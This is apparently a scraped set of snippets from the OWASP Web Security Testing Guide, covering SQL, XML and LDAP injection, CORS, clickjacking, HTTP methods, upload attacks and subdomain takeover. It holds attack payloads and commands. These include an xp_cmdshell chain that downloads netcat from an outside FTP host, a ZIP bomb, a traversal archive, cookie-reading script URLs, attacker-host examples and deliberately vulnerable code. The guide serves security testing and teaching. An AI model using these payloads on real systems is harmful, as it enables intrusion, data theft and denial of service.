https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_14\n\nLANGUAGE: html\nCODE:\n```\nMicrosoft SQL Native Client error '80040e14'\nUnclosed quotation mark after the character string\n\nSELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1\n```\n\n----------------------------------------\n\nTITLE: Implementing Locked Down Strict CSP Policy Header\nDESCRIPTION: A more restrictive Content Security Policy configuration that only allows nonce-based scripts while blocking all object sources and base URI modifications.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy.md#2025-04-22_snippet_1\n\nLANGUAGE: HTTP\nCODE:\n```\nscript-src 'nonce-r4nd0m';\nobject-src 'none'; base-uri 'none';\n```\n\n----------------------------------------\n\nTITLE: Uploading Executables via FTP using xp_cmdshell in SQL Server\nDESCRIPTION: A series of SQL injection commands that use xp_cmdshell to create an FTP script file and then execute it to download netcat (nc.exe) from an attacker's FTP server to the target SQL Server.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server.md#2025-04-22_snippet_7\n\nLANGUAGE: sql\nCODE:\n```\nexec master..xp_cmdshell 'echo open ftp.tester.org > ftpscript.txt';--\nexec master..xp_cmdshell 'echo USER >> ftpscript.txt';--\nexec master..xp_cmdshell 'echo PASS >> ftpscript.txt';--\nexec master..xp_cmdshell 'echo bin >> ftpscript.txt';--\nexec master..xp_cmdshell 'echo get nc.exe >> ftpscript.txt';--\nexec master..xp_cmdshell 'echo quit >> ftpscript.txt';--\nexec master..xp_cmdshell 'ftp -s:ftpscript.txt';--\n```\n\n----------------------------------------\n\nTITLE: Analyzing Authentication Bypass in PHP Using Loose Comparison\nDESCRIPTION: This PHP code snippet demonstrates a vulnerability in PHPBB 2.0.12 where authentication can be bypassed due to loose comparison. It shows how unserializing user-supplied data and comparing it with stored credentials can lead to unauthorized access.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema.md#2025-04-22_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n1. if (isset($HTTP_COOKIE_VARS[$cookiename . '_sid'])) {\n2.     $sessiondata = isset($HTTP_COOKIE_VARS[$cookiename . '_data']) ? unserialize(stripslashes($HTTP_COOKIE_VARS[$cookiename . '_data'])) : array();\n3.     $sessionmethod = SESSION_METHOD_COOKIE;\n4. }\n5. $auto_login_key = $userdata['user_password'];\n6. // We have to login automagically\n7. if( $sessiondata['autologinid'] == $auto_login_key )\n8. {\n9.     // autologinid matches password\n10.     $login = 1;\n11.     $enable_autologin = 1;\n12. }\n```\n\n----------------------------------------\n\nTITLE: Testing for Client-Side HTTP Parameter Pollution\nDESCRIPTION: Example of test payloads to use when testing for client-side HTTP Parameter Pollution vulnerabilities. These payloads should be injected into each HTTP parameter to identify if the application is vulnerable.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution.md#2025-04-22_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n%26HPP_TEST\n```\n\n----------------------------------------\n\nTITLE: HTML Form Field with Bracket Syntax\nDESCRIPTION: An HTML input field using bracket syntax for parameter names, which is a common indicator of potential mass assignment vulnerabilities. This pattern often appears in frameworks that support complex object binding.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment.md#2025-04-22_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<input name=\"user[name]\" type=\"text\">\n```\n\n----------------------------------------\n\nTITLE: Implementing Magic Parameter Check in Java Servlet\nDESCRIPTION: This code snippet demonstrates a simple implementation of a 'magic parameter' check in a Java servlet. It compares a hardcoded string with a parameter from the HTTP request to grant administrative access.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/2-Introduction/README.md#2025-04-22_snippet_2\n\nLANGUAGE: java\nCODE:\n```\npublic void doPost( HttpServletRequest request, HttpServletResponse response) {\n  String magic = \"sf8g7sfjdsurtsdieerwqredsgnfg8d\";\n  boolean admin = magic.equals( request.getParameter(\"magic\"));\n  if (admin) doAdmin( request, response);\n  else … // normal processing\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Simple ZIP Bomb in Bash\nDESCRIPTION: This bash command creates a 1MB ZIP file that will decompress to 1GB, demonstrating a basic ZIP bomb technique. It uses dd to create a file of zeros and then compresses it using zip with maximum compression.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files.md#2025-04-22_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ndd if=/dev/zero bs=1M count=1024 | zip -9 > bomb.zip\n```\n\n----------------------------------------\n\nTITLE: HTTP 1.0 Cache Prevention Headers Example\nDESCRIPTION: Example of HTTP/1.0 response headers using Pragma and Expires directives to prevent browsers from caching sensitive content. These headers instruct older browsers to not store page content in their cache.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\nHTTP/1.0:\nPragma: no-cache\nExpires: \"past date or illegal value (e.g., 0)\"\n```\n\n----------------------------------------\n\nTITLE: LDAP Injection in Search Filters\nDESCRIPTION: Example of a vulnerable LDAP search filter implementation and how it can be exploited by injecting wildcard characters to retrieve all records.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection.md#2025-04-22_snippet_1\n\nLANGUAGE: txt\nCODE:\n```\nsearchfilter=\"(cn=\"+user+\")\"\n```\n\n----------------------------------------\n\nTITLE: HTTP Parameter Pollution Regular Attack Example\nDESCRIPTION: An example of a standard XSS attack vector that might be blocked by security filters, shown for comparison with the HTTP Parameter Pollution technique.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md#2025-04-22_snippet_7\n\nLANGUAGE: text\nCODE:\n```\nhttps://example/page.php?param=<script>[...]</script>\n```\n\n----------------------------------------\n\nTITLE: Constructing XML Node from User Input in XML\nDESCRIPTION: Demonstrates how an application might construct an XML node from user-provided registration data.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection.md#2025-04-22_snippet_1\n\nLANGUAGE: xml\nCODE:\n```\n<user>\n    <username>tony</username>\n    <password>Un6R34kb!e</password>\n    <userid>500</userid>\n    <mail>s4tan@hell.com</mail>\n</user>\n```\n\n----------------------------------------\n\nTITLE: Insecure Domain Validation with indexOf in JavaScript\nDESCRIPTION: Example of insecure domain validation using indexOf that could allow attackers to bypass the filter with specially crafted domains.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nwindow.addEventListener(\"message\", callback, true);\n\nfunction callback(e) {\n    if(e.origin.indexOf(\".owasp.org\")!=-1) {\n        /* process message (e.data) */\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Performing WHOIS Lookup for IP Address in Bash\nDESCRIPTION: This snippet demonstrates how to use the whois command in combination with grep to identify the organization associated with a specific IP address. This is useful for determining the service provider of a potentially vulnerable subdomain.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ whois 192.30.252.153 | grep \"OrgName\"\nOrgName: GitHub, Inc.\n```\n\n----------------------------------------\n\nTITLE: Java Implementation of PBKDF2 for Password Hashing\nDESCRIPTION: This code snippet demonstrates a secure implementation of PBKDF2 for password hashing in Java. It emphasizes the importance of using a high number of iterations and a random salt.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption.md#2025-04-22_snippet_5\n\nLANGUAGE: java\nCODE:\n```\nprivate static byte[] pbkdf2(char[] password, byte[] salt, int iterations, int bytes)\n    throws NoSuchAlgorithmException, InvalidKeySpecException\n  {\n       PBEKeySpec spec = new PBEKeySpec(password, salt, iterations, bytes * 8);\n       SecretKeyFactory skf = SecretKeyFactory.getInstance(PBKDF2_ALGORITHM);\n       return skf.generateSecret(spec).getEncoded();\n   }\n```\n\n----------------------------------------\n\nTITLE: Testing Price Tampering with Cross-Domain POST Form\nDESCRIPTION: Example HTML form that demonstrates how payment information is sent to a payment gateway via cross-domain POST, which could be manipulated to tamper with prices.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/10-Test-Payment-Functionality.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<form action=\"https://example.org/process_payment\" method=\"POST\">\n    <input type=\"hidden\" id=\"merchant_id\" value=\"123\" />\n    <input type=\"hidden\" id=\"basket_id\" value=\"456\" />\n    <input type=\"hidden\" id=\"item_id\" value=\"1\" />\n    <input type=\"hidden\" id=\"item_quantity\" value=\"5\" />\n    <input type=\"hidden\" id=\"item_total\" value=\"20.00\" />\n    <input type=\"hidden\" id=\"shipping_total\" value=\"2.00\" />\n    <input type=\"hidden\" id=\"basket_total\" value=\"22.00\" />\n    <input type=\"hidden\" id=\"currency\" value=\"GBP\" />\n    <input type=\"submit\" id=\"submit\" value=\"submit\" />\n</form>\n```\n\n----------------------------------------\n\nTITLE: Creating a Malicious ZIP File for Directory Traversal Testing\nDESCRIPTION: Bash commands to create a test ZIP file that contains a traversal attack payload, which can be used to test an application's vulnerability to archive directory traversal attacks.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n# Open a new terminal and create a tree structure\n# (more directory levels might be required based on the system being targeted)\nmkdir -p a/b/c\n# Create a base file\necho 'base' > a/b/c/base\n# Create a traversed file\necho 'traversed' > traversed\n# You can double check the tree structure using `tree` at this stage\n# Navigate to a/b/c root directory\ncd a/b/c\n# Compress the files\nzip test.zip base ../../../traversed\n# Verify compressed files content\nunzip -l test.zip\n```\n\n----------------------------------------\n\nTITLE: Final XML Structure After Advanced Injection\nDESCRIPTION: Demonstrates the resulting XML structure after applying the advanced injection technique with comments, successfully bypassing DTD validation.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection.md#2025-04-22_snippet_10\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<users>\n    <user>\n        <username>gandalf</username>\n        <password>!c3</password>\n        <userid>0</userid>\n        <mail>gandalf@middleearth.com</mail>\n    </user>\n    <user>\n        <username>Stefan0</username>\n        <password>w1s3c</password>\n        <userid>500</userid>\n        <mail>Stefan0@whysec.hmm</mail>\n    </user>\n    <user>\n        <username>tony</username>\n        <password>Un6R34kb!e</password><!--</password>\n        <userid>500</userid>\n        <mail>--><userid>0</userid><mail>s4tan@hell.com</mail>\n    </user>\n</users>\n```\n\n----------------------------------------\n\nTITLE: Testing DELETE Method for File Deletion\nDESCRIPTION: Demonstrates how to use the DELETE method to attempt deleting a file from a web server. This is a destructive action and should be used with extreme caution.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md#2025-04-22_snippet_6\n\nLANGUAGE: http\nCODE:\n```\nDELETE /test.html HTTP/1.1\nHost: example.org\n```\n\n----------------------------------------\n\nTITLE: Checking HSTS Header Using Curl Command in Bash\nDESCRIPTION: Command to verify the presence of HSTS header in server response using curl. The command performs a HTTPS request and filters the response headers to check for the Strict-Transport-Security header.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ curl -s -D- https://owasp.org | grep -i strict-transport-security:\nStrict-Transport-Security: max-age=31536000\n```\n\n----------------------------------------\n\nTITLE: Testing Menu Item Parameter for Unauthorized Functionality Access\nDESCRIPTION: This example demonstrates how modifying a menuitem parameter value might allow bypassing authorization controls to access restricted application functionality.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References.md#2025-04-22_snippet_3\n\nLANGUAGE: text\nCODE:\n```\nhttps://foo.bar/accessPage?menuitem=12\n```\n\n----------------------------------------\n\nTITLE: Malicious CORS Origin Header Request\nDESCRIPTION: An HTTP request example showing how an attacker might attempt to bypass a poorly implemented CORS policy by manipulating the Origin header to match a subpattern recognized by the server.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing.md#2025-04-22_snippet_4\n\nLANGUAGE: http\nCODE:\n```\nGET /test.php HTTP/1.1\nHost: example.com\n[...]\nOrigin: https://example.com.attacker.com\nCookie: <session cookie>\n```\n\n----------------------------------------\n\nTITLE: HTML Object Tag with FlashVars Parameters\nDESCRIPTION: Demonstrates how FlashVars are passed to a Flash object from HTML using both object and embed tags. These variables can be used as attack vectors if not properly validated.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<object width=\"550\" height=\"400\" classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\"\ncodebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,124,0\">\n    <param name=\"movie\" value=\"somefilename.swf\">\n    <param name=\"FlashVars\" value=\"var1=val1&var2=val2\">\n    <embed src=\"somefilename.swf\" width=\"550\" height=\"400\" FlashVars=\"var1=val1&var2=val2\">\n</embed>\n</object>\n```\n\n----------------------------------------\n\nTITLE: Configuring Apache to Block Access to Filesystem Snapshots\nDESCRIPTION: This Apache configuration snippet demonstrates how to deny web access to filesystem snapshot directories that might contain sensitive historical data. It uses the Location directive to block all access to directories containing the .snapshot pattern.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information.md#2025-04-22_snippet_5\n\nLANGUAGE: xml\nCODE:\n```\n<Location ~ \".snapshot\">\n    Order deny,allow\n    Deny from all\n</Location>\n```\n\n----------------------------------------\n\nTITLE: Exploiting JavaScript Injection in Client-side Redirection\nDESCRIPTION: This example URL demonstrates how an attacker could exploit the JavaScript injection vulnerability in the client-side redirection code. It includes JavaScript code in the hash parameter that would be executed when the redirection occurs.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect.md#2025-04-22_snippet_4\n\nLANGUAGE: text\nCODE:\n```\nhttps://www.victim.site/?#javascript:alert(document.cookie)\n```\n\n----------------------------------------\n\nTITLE: Querying Nameservers with dig in Bash\nDESCRIPTION: This code snippet shows how to use the dig command to query and display the nameservers for a given domain. This is useful for identifying potential NS record subdomain takeover vulnerabilities.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover.md#2025-04-22_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$ dig ns victim.com +short\nns1.victim.com\nnameserver.expireddomain.com\n```\n\n----------------------------------------\n\nTITLE: Compromised Password Reset Email\nDESCRIPTION: An example of a password reset email containing a link with the attacker's domain, which would allow the attacker to steal the reset token when clicked.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection.md#2025-04-22_snippet_6\n\nLANGUAGE: text\nCODE:\n```\n... Email snippet ...\n\nClick on the following link to reset your password:\n\nhttps://www.attacker.com/reset.php?token=12345\n\n... Email snippet ...\n```\n\n----------------------------------------\n\nTITLE: Example XML Database Structure in XML\nDESCRIPTION: Shows the structure of an example XML database file containing user information.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection.md#2025-04-22_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<users>\n    <user>\n        <username>gandalf</username>\n        <password>!c3</password>\n        <userid>0</userid>\n        <mail>gandalf@middleearth.com</mail>\n    </user>\n    <user>\n        <username>Stefan0</username>\n        <password>w1s3c</password>\n        <userid>500</userid>\n        <mail>Stefan0@whysec.hmm</mail>\n    </user>\n</users>\n```\n\n----------------------------------------\n\nTITLE: Malicious URL Example\nDESCRIPTION: Example of a malicious URL that exploits the CORS vulnerability to load external content.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing.md#2025-04-22_snippet_8\n\nLANGUAGE: text\nCODE:\n```\nhttps://example.foo/main.php#https://attacker.bar/file.php\n```\n\n----------------------------------------\n\nTITLE: IMAP Injection Components Breakdown\nDESCRIPTION: Explanation of the different components in an IMAP injection attack, showing the header, body, and footer structure needed to inject arbitrary commands.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection.md#2025-04-22_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nHeader = 4791 BODY[HEADER]\nBody   = %0d%0aV100 CAPABILITY%0d%0a\nFooter = V101 FETCH 4791\n```\n\n----------------------------------------\n\nTITLE: Using HTML5 Sandbox Attribute for iframe Protection\nDESCRIPTION: HTML example showing how to use the sandbox attribute with an iframe, which enables a set of restrictions on content loaded into the iframe as a protection mechanism.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<iframe src=\"https://example.org\" sandbox></iframe>\n```\n\n----------------------------------------\n\nTITLE: HTML Form for User Creation\nDESCRIPTION: An HTML form that collects user input for creating a new user account. It includes fields for username, password, and email, but not for the isAdmin property which could be exploited via mass assignment.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<form action=\"/createUser\" method=\"POST\">\n     <input name=\"username\" type=\"text\">\n     <input name=\"password\" type=\"text\">\n     <input name=\"email\" text=\"text\">\n     <input type=\"submit\" value=\"Create\">\n</form>\n```\n\n----------------------------------------\n\nTITLE: MySQL UNION Query with Version Check\nDESCRIPTION: SQL injection using UNION SELECT to retrieve the database version information from a MySQL database, which helps identify the backend database system.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_12\n\nLANGUAGE: sql\nCODE:\n```\nSELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1\n```\n\n----------------------------------------\n\nTITLE: Insecure Transmission of Session Cookie over HTTP\nDESCRIPTION: This HTTP request/response example shows a subsequent request after login where the session cookie is transmitted over unencrypted HTTP, making it vulnerable to interception and session hijacking.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels.md#2025-04-22_snippet_3\n\nLANGUAGE: http\nCODE:\n```\nhttp://example.com/private\n\nGET /private HTTP/1.1\nHost: example.com\n[...]\nReferer: https://secure.example.com/login\nCookie: JSESSIONID=BD99F321233AF69593EDF52B123B5BDA;\n\nHTTP/1.1 200 OK\nContent-Type: text/html;charset=UTF-8\nContent-Length: 730\nDate: Tue, 25 Dec 2013 00:00:00 GMT\n```\n\n----------------------------------------\n\nTITLE: Malicious Request Exploiting Undefined Variables\nDESCRIPTION: Example of a URL that exploits the vulnerable code by injecting a malicious XML file location through the undefined _root.language variable.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md#2025-04-22_snippet_5\n\nLANGUAGE: text\nCODE:\n```\nhttps://victim/file.swf?language=https://evil.example.org/malicious.xml?\n```\n\n----------------------------------------\n\nTITLE: Creating a Basic Clickjacking Test Page using HTML iframe\nDESCRIPTION: HTML code sample demonstrating how to create a test page that loads a target website in an iframe to check for Clickjacking vulnerability. If the target site loads successfully in the frame, it may be vulnerable to Clickjacking attacks.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<html>\n    <head>\n        <title>Clickjack test web page</title>\n    </head>\n    <body>\n        <iframe src=\"https://www.target.site\" width=\"400\" height=\"400\"></iframe>\n    </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Enumerating DNS Records with dnsrecon in Bash\nDESCRIPTION: This snippet demonstrates how to use the dnsrecon tool to perform basic DNS enumeration on a victim's domain. It retrieves A and CNAME records, which are essential for identifying potential subdomain takeover vulnerabilities.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ ./dnsrecon.py -d victim.com\n[*] Performing General Enumeration of Domain: victim.com\n...\n[-] DNSSEC is not configured for victim.com\n[*]      A subdomain.victim.com 192.30.252.153\n[*]      CNAME subdomain1.victim.com fictioussubdomain.victim.com\n...\n```\n\n----------------------------------------\n\nTITLE: Testing CONNECT Method for Proxy Functionality\nDESCRIPTION: Demonstrates how to use the CONNECT method, which could potentially allow an attacker to proxy traffic through the server. This could be used to hide the source address or access internal systems.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md#2025-04-22_snippet_10\n\nLANGUAGE: http\nCODE:\n```\nCONNECT 192.168.0.1:443 HTTP/1.1\nHost: example.org\n```\n\n----------------------------------------\n\nTITLE: Amazon S3 Path-Style URL Format\nDESCRIPTION: Format for accessing S3 buckets using path-style\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage.md#2025-04-22_snippet_3\n\nLANGUAGE: text\nCODE:\n```\nhttps://s3.Region.amazonaws.com/bucket-name/key-name\n```\n\n----------------------------------------\n\nTITLE: HTTP POST Request for File Upload\nDESCRIPTION: Example of an HTTP POST request for file upload functionality. This shows the Content-Disposition header and how files are typically uploaded, which could be exploited for XSS if file type validation is insufficient.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.md#2025-04-22_snippet_5\n\nLANGUAGE: http\nCODE:\n```\nPOST /fileupload.aspx HTTP/1.1\n[…]\nContent-Disposition: form-data; name=\"uploadfile1\"; filename=\"C:\\Documents and Settings\\test\\Desktop\\test.txt\"\nContent-Type: text/plain\n\ntest\n```\n\n----------------------------------------\n\nTITLE: Testing Special Header Bypass - X-Original-URL\nDESCRIPTION: Request testing support for X-Original-URL header by pointing to non-existent resource.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema.md#2025-04-22_snippet_4\n\nLANGUAGE: html\nCODE:\n```\nGET / HTTP/1.1\nHost: www.example.com\nX-Original-URL: /donotexist1\n[...]\n```\n\n----------------------------------------\n\nTITLE: ASCII Character Encoding Query for PostgreSQL\nDESCRIPTION: SQL queries to convert the string 'root' into ASCII values using the ascii() function.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL.md#2025-04-22_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nselect ascii('r')\n114\nselect ascii('o')\n111\nselect ascii('t')\n116\n```\n\n----------------------------------------\n\nTITLE: Google Dorking Query for API Endpoints\nDESCRIPTION: Example Google search query syntax to discover API endpoints within a target site. This query uses the 'site' and 'inurl' operators to find pages containing API-related paths.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/12-API_Testing/01-API_Reconnaissance.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nsite:\"mytargetsite.com\" inurl:\"/api\"\n```\n\n----------------------------------------\n\nTITLE: PL/SQL Execution Flow with Injected Parameter\nDESCRIPTION: This code shows how a maliciously crafted input is processed by the PL/SQL Gateway. It demonstrates the execution flow when an injection point is introduced, causing a syntax error that can be exploited further.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle.md#2025-04-22_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\n..\nsimple_list__(7) := 'htf.%';\nif ((owa_match.match_pattern('inject'point', simple_list__ complex_list__, true))) then\n rc__ := 2;\nelse\n null;\n orasso.wpg_session.init();\n inject'point;\n..\n```\n\n----------------------------------------\n\nTITLE: Implementing a Basic File Guessing Attack Script in Bash\nDESCRIPTION: This bash script reads a wordlist from stdin and performs a basic guessing attack against a web server. It sends GET requests for each potential file/directory and outputs the HTTP response code, allowing testers to identify valid resources on the server.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information.md#2025-04-22_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n#!/bin/bash\n\nserver=example.org\nport=80\n\nwhile read url\ndo\necho -ne \"$url\\t\"\necho -e \"GET /$url HTTP/1.0\\nHost: $server\\n\" | netcat $server $port | head -1\ndone | tee outputfile\n```\n\n----------------------------------------\n\nTITLE: HTTP Request for Unauthorized Event Deletion\nDESCRIPTION: HTTP POST request attempting to delete an event with a customer's session. This demonstrates how an attacker might attempt vertical privilege escalation by performing administrator actions with a lower-privilege session.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation.md#2025-04-22_snippet_6\n\nLANGUAGE: http\nCODE:\n```\nPOST /account/deleteEvent HTTP/1.1\nHost: www.example.com\n[other HTTP headers]\nCookie: SessionID=CUSTOMER_USER_SESSION\n\nEventID=1000002\n```\n\n----------------------------------------\n\nTITLE: Exception Messages Indicating Padding Oracle Vulnerabilities\nDESCRIPTION: Examples of error messages thrown by different programming languages when padding of a decrypted cipher text is invalid, which can be used to identify the presence of padding oracles.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle.md#2025-04-22_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nASP.NET throws System.Security.Cryptography.CryptographicException: Padding is invalid and cannot be removed. if padding of a decrypted cipher text is broken.\nIn Java a javax.crypto.BadPaddingException is thrown in this case.\nDecryption errors or similar can be possible padding oracles.\n```\n\n----------------------------------------\n\nTITLE: Analyzing SQL Query with Aliases and Case Statements\nDESCRIPTION: This SQL snippet shows a complex query using aliases and CASE statements, which can interfere with traditional UNION-based injection techniques. The vulnerability is in the CASE statement.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_21\n\nLANGUAGE: SQL\nCODE:\n```\nSELECT \n  s1.user_id, \n  (                                                                                      --\\\n    CASE WHEN s2.user_id IS NOT NULL AND s2.sub_type = 'INJECTION_HERE' THEN 1 ELSE 0 END   |--\\> vulnerable query\n  ) AS overlap                                                                           --/\nFROM \n  subscriptions AS s1 \n  LEFT JOIN subscriptions AS s2 ON s1.user_id != s2.user_id \n  AND s1.start_date <= s2.end_date \n  AND s1.end_date >= s2.start_date \nGROUP BY \n  s1.user_id\n```\n\n----------------------------------------\n\nTITLE: WebSocket URI Schemes\nDESCRIPTION: Examples of WebSocket URI schemes for both encrypted and unencrypted connections. The ws:// scheme is used for unencrypted connections on port 80, while wss:// is used for TLS-encrypted connections on port 443.\nSOURCE: 